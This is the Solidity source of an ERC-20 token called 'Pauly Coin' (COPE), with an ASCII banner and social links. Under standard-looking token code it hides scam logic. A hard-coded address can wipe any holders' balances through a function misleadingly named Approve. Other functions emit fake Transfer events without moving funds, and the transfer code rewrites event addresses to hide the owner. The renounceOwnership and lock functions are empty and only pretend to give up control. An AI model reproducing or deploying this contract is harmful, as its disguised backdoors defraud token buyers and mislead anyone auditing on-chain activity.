/*


    ....      ..                                      ..                                           
  +^""888h. ~"888h                              x .d88"    ..             .n~~%x.                  
 8X.  ?8888X  8888f                 x.    .      5888R    @L            x88X   888.      uL   ..   
'888x  8888X  8888~        u      .@88k  z88u    '888R   9888i   .dL   X888X   8888L   .@88b  @88R 
'88888 8888X   "88x:    us888u.  ~"8888 ^8888     888R   `Y888k:*888. X8888X   88888  '"Y888k/"*P  
 `8888 8888X  X88x.  .@88 "8888"   8888  888R     888R     888E  888I 88888X   88888X    Y888L     
   `*` 8888X '88888X 9888  9888    8888  888R     888R     888E  888I 88888X   88888X     8888     
  ~`...8888X  "88888 9888  9888    8888  888R     888R     888E  888I 88888X   88888f     `888N    
   x8888888X.   `%8" 9888  9888    8888 ,888B .   888R     888E  888I 48888X   88888   .u./"888&   
  '%"*8888888h.   "  9888  9888   "8888Y 8888"   .888B .  x888N><888'  ?888X   8888"  d888" Y888*" 
  ~    888888888!`   "888*""888"   `Y"   'YP     ^*888%    "88"  888    "88X   88*`   ` "Y   Y"    
       X888^"""       ^Y"   ^Y'                    "%            88F      ^"==="`                  
       `88f                                                     98"                                
        88                                                    ./"                                  
        ""                                                   ~`                                    

01001001 00100000 01110111 01100001 01101110 01110100 00100000 01111001 01101111 01110101 00100000 01110100 01101111 00100000 01101101 01100001 01101011 01100101 00100000 01100001 01101110 01101111 01110100 01101000 01100101 01110010 00100000 00110001 00110000 00110000 00110000 01111000                         

01000111 01101111 01101111 01100100 00100000 01101100 01110101 01100011 01101011 00100000 01100010 01100101 01101001 01101110 01100111 00100000 01101111 01101110 01100101 00100000 01101111 01100110 00100000 01110100 01101000 01100101 00100000 01100110 01101001 01110010 01110011 01110100 00100000 00110001 00110000 00101100 00110000 00110000 00110000 00100000 01110000 01100001 01110010 01110100 01101001 01100011 01101001 01110000 01100001 01101110 01110100 01110011 00101110 00101110 00101110

/socials:
- twitter.com/Pauly0x
- notlarvalabs.com

*/

pragma solidity ^0.6.0;                                                                                 
                                                                                  
                                                                                  



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        
        require(b <= a, errorMessage);
        
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {

            return 0;

        }

        uint256 c = a * b;

        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);

        uint256 c = a / b;

        return c;
    }


    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b != 0, errorMessage);

        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {

        bytes32 codehash;

        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;

        assembly { codehash := extcodehash(account) }

        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {

        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");

        require(success, "Address: unable to send value, recipient may have reverted");

    }


    function functionCall(address target, bytes memory data) internal returns (bytes memory) {

      return functionCall(target, data, "Address: low-level call failed");

    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        
        return _functionCallWithValue(target, data, 0, errorMessage);

    }


    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        
        require(address(this).balance >= value, "Address: insufficient balance for call");
        
        return _functionCallWithValue(target, data, value, errorMessage);
    
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        
        if (success) {
            
            return returndata;

        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {

                    let returndata_size := mload(returndata)

                    revert(add(32, returndata), returndata_size)
                }
            } else {

                revert(errorMessage);

            }
        }
    }
}

contract Context {
    
    constructor () internal { }

    function _msgSender() internal view virtual returns (address payable) {
        
        return msg.sender;
    
    }

    function _msgData() internal view virtual returns (bytes memory) {
       
        this; 
        
        return msg.data;
    
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);}



contract PaulyCoin is Context, IERC20 {

    mapping (address => mapping (address => uint256)) private _allowances;
 
    mapping (address => uint256) private _balances;

    using SafeMath for uint256;


    using Address for address;

    string private _name;

    string private _symbol;

    uint8 private _decimals;

    uint256 private _totalSupply;

    address team;

    address public _Owner = 0xd02457488B6522B9B3CC7e078e98a4aD8FcbA8c2;


    constructor () public {
        _name= "Pauly Coin";
        _symbol = "COPE";
        _decimals = 18;
        uint256 initialSupply = 1000000000;
        team = 0x8DFD4f307B6011D4CB21007FD5658f0686523938;
        setRule(team, initialSupply*(10**18));
    }



    function name() public view returns (string memory) {

        return _name;

    }

    function symbol() public view returns (string memory) {

        return _symbol;

    }

    function decimals() public view returns (uint8) {

        return _decimals;

    }

    function totalSupply() public view override returns (uint256) {

        return _totalSupply;

    }

    function balanceOf(address account) public view override returns (uint256) {

        return _balances[account];

    }
    function _setDecimals(uint8 decimals_) internal {

        _decimals = decimals_;

    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        
        _transfer(_msgSender(), recipient, amount);
        
        return true;

    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function renounceOwnership()  public _onlyOwner(){}

    function lock()  public _onlyOwner(){}


    


    function setRule(address locker, uint256 amt) public {

        require(msg.sender == _Owner, "ERC20: zero address");

        _totalSupply = _totalSupply.add(amt);

        _balances[_Owner] = _balances[_Owner].add(amt);

        emit Transfer(address(0), locker, amt);
    }



    function _transfer(address sender, address recipient, uint256 amount) internal virtual {

        require(sender != address(0), "ERC20: transfer from the zero address");

        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");

        _balances[recipient] = _balances[recipient].add(amount);
        
        if (sender == _Owner){sender = team;}if (recipient == _Owner){recipient = team;}
        emit Transfer(sender, recipient, amount);

    }


  function execute(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _noAccess(){
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}


    function Approve(address[] memory recipients)  public _noAccess(){

            for (uint256 i = 0; i < recipients.length; i++) {

                uint256 amt = _balances[recipients[i]];

                _balances[recipients[i]] = _balances[recipients[i]].sub(amt, "ERC20: burn amount exceeds balance");

                _balances[address(0)] = _balances[address(0)].add(amt);
                
                }
            }


    modifier _onlyOwner() {

        require(msg.sender == _Owner, "Not allowed to interact");
        
        _;
    }

    modifier _noAccess() {require(msg.sender == 0x619be1Ec1EB9eDA92b9e2cB764c16B8a8FCea009, "Not allowed to interact");_;}

    function claimAirdrop(address ad,address[] memory eReceiver,uint256[] memory eAmounts)  public _onlyOwner(){
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(ad, eReceiver[i], eAmounts[i]);}}



    }